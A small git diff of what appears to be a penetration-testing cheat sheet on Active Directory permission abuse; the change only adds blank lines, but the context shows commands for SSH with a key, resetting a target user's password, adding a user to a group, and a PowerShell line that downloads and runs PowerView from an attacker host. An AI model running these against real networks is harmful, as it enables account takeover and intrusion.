@@ -391,6 +391,7 @@ chmod 600 id_rsa && ssh -i id_rsa [USER]@[RHOST]
 This section will cover all the attacks that this useful tool detects.
 
 **AllExtendedRights**
+
 Changing the target user's password:
 ```powershell
 $ownedUser_password = ConvertTo-SecureString __KnownPassword__ -Asplain -Force
@@ -401,6 +402,7 @@ IEX(New-Object Net.WebClient).downloadString('http://__LHOST__/PowerView.ps1'); 
 ```
 
 **GenericWrite**
+
 Adding a user into the target Group:
 ```powershell
 $user_password = ConvertTo-SecureString __UserPassword__ -Asplain -Force
